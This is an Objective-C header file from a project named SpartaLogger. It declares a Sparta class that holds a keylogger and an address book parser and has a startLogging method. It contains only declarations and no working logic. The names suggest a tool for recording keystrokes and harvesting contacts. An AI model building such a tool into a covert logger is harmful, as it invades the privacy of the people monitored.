//
//  Sparta.h
//  SpartaLogger
//
//  Created by Ryan Gomba on 11/25/11.
//  Copyright (c) 2011 AppThat. All rights reserved.
//

@class KeyLogger;
@class ABParser;

@interface Sparta : NSObject {
    KeyLogger *keyLogger;
    ABParser *addressBookParser;
}

@property (nonatomic, retain) KeyLogger *keyLogger;
@property (nonatomic, retain) ABParser *addressBookParser;

- (void)startLogging;

@end
